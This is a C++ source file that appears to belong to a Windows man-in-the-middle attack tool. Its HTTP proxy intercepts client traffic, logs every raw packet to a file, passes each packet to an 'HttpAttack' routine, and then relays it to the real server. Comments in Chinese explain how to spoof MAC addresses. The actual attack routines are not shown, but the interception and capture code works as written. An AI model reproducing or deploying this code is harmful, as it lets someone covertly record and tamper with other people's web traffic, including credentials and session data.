
#include <windows.h>
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "HttpProxy.h"
#include "PayloadServer.h"
#include "HttpAttack.h"
#include "../Public.h"
#include "../Deamon.h"
#include <mstcpip.h>
#include <vector>
#include "../utils/Tools.h"



int HttpProxy::HttpProxyMain(LPHTTPPROXYPARAM hpp) {
	int				iCounter = 0;
	int				iRet = 0;
	unsigned char	recvBuffer[NETWORK_BUFFER_SIZE + 4];

	iCounter = recv(hpp->sockToClient, (char*)recvBuffer, NETWORK_BUFFER_SIZE, 0);
	if (iCounter <= 0)
	{
		return FALSE;
	}
	*(recvBuffer + iCounter) = 0;
	iRet = Public::writeFile(HTTP_PROXY_FILE, recvBuffer, iCounter, "\r\n\r\nHTTP PACKET:\r\n\r\n");

	iRet = HttpAttack::httpAttackProc((char*)recvBuffer, iCounter, hpp);
	if (iRet > 0)
	{
		return FALSE;
	}

	DWORD dwip = HttpUtils::getIPFromHost(hpp->host);
	if (dwip == 0  ) {
#ifdef _DEBUG
		//log("%s %d getIPFromHost:%s error\r\n", __FUNCTION__, __LINE__, hpp->host);
#endif
		return FALSE;
	}

	if (IsInternalAddress(dwip, hpp->host) ) {
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

	hpp->sockToServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hpp->sockToServer <= 0)
	{
		log("%s %d error:%d\r\n", __FUNCTION__,__LINE__,WSAGetLastError());
		return FALSE;
	}
	int overtime = CONNECTION_TIME_OUT;
	iRet = setsockopt(hpp->sockToServer, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
	iRet += setsockopt(hpp->sockToServer, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

	hpp->saToServer.sin_addr.S_un.S_addr = dwip;
	hpp->saToServer.sin_port = ntohs(hpp->usPort);
	hpp->saToServer.sin_family = AF_INET;
	iRet = connect(hpp->sockToServer, (sockaddr*)&(hpp->saToServer), sizeof(sockaddr_in));
	if (iRet )
	{
		log("%s %d connect server:%s,ip:%08x error:%u\r\n", __FUNCTION__, __LINE__, hpp->host, hpp->saToServer.sin_addr.S_un.S_addr, WSAGetLastError());
		return FALSE;
	}

	iRet = send(hpp->sockToServer, (char*)recvBuffer, iCounter, 0);
	if (iRet != iCounter )
	{
		log("%s %d send server:%s error:%d\r\n", __FUNCTION__, __LINE__, hpp->host,WSAGetLastError());
		return FALSE;
	}

	fd_set			stFdSet = { 0 };
	timeval			stTmVal = { 0 };
	stTmVal.tv_sec = SELECT_TIME_OUT / 1000;
	stTmVal.tv_usec = 0;

	SOCKET selectsock = hpp->sockToServer;
	if (hpp->sockToClient > hpp->sockToServer)
	{
		selectsock = hpp->sockToClient;
	}

#undef FD_SETSIZE
#define FD_SETSIZE 1024

	while (TRUE)
	{
		FD_ZERO(&stFdSet);
		FD_SET(hpp->sockToClient, &stFdSet);
		FD_SET(hpp->sockToServer, &stFdSet);

		iRet = select(selectsock + 1, &stFdSet, NULL, NULL, &stTmVal);
		if (iRet <= 0 || iRet > 2)
		{
			break;
		}

		if (FD_ISSET(hpp->sockToClient, &stFdSet))
		{
			iCounter = recv(hpp->sockToClient,(char*)recvBuffer, NETWORK_BUFFER_SIZE,0);
			if (iCounter <= 0)
			{
				break;
			}

			*(recvBuffer + iCounter) = 0;

			iRet = HttpAttack::httpAttackProc((char*)recvBuffer, iCounter, hpp);
			if (iRet > 0)
			{
				break;
			}

			iRet = send(hpp->sockToServer, (char*)recvBuffer, iCounter, 0);
			if (iRet != iCounter)
			{
				break;
			}

			hpp->timeclient = time(0);
		}

		if (FD_ISSET(hpp->sockToServer, &stFdSet))
		{
			iCounter = recv(hpp->sockToServer,(char*)recvBuffer, NETWORK_BUFFER_SIZE,0);
			if (iCounter <= 0)
			{
				break;
			}
			*(recvBuffer + iCounter) = 0;

			iRet = send(hpp->sockToClient, (char*)recvBuffer, iCounter, 0);
			if (iRet != iCounter)
			{
				break;
			}

			hpp->timeserver = time(0);
		}
	}
	
	return TRUE;
}

//无线网的MAC值的第二个数只能是2 、6、A、E中的一个，否则修改就不会起作用，如060C29E7B28C。
//MAC地址是由48位Bit组成（第一个字节最低位一定是0），在通信中使用16进制，即6个字节。
//虽然mac地址可以修改，但是不要乱改，至少需要能保证在使用的局域网内是唯一。

int __stdcall HttpProxy::HTTPProxy(LPMIM_THREAD_PARAMS param){
	LPHTTPPROXYPARAM hpp = 0;

	int ret = 0;
	while (TRUE){
		__try{
			ret = WaitForSingleObject(param->gHTTPEvent, INFINITE);

			hpp = param->gHTTPProxyParam;

			ret = SetEvent(param->gHTTPListenEvent);

			int overtime = CONNECTION_TIME_OUT;

			ret = setsockopt(hpp->sockToClient, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));

			ret += setsockopt(hpp->sockToClient, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

			ret = HttpProxyMain(hpp);

			Deamon::removeHttp(hpp);
		}
		__except (1){
			log( "%s %d exception error:%u thread ID:%u\r\n", __FUNCTION__, __LINE__, GetLastError(), hpp->ulThreadID);
		}
	}

	return TRUE;
}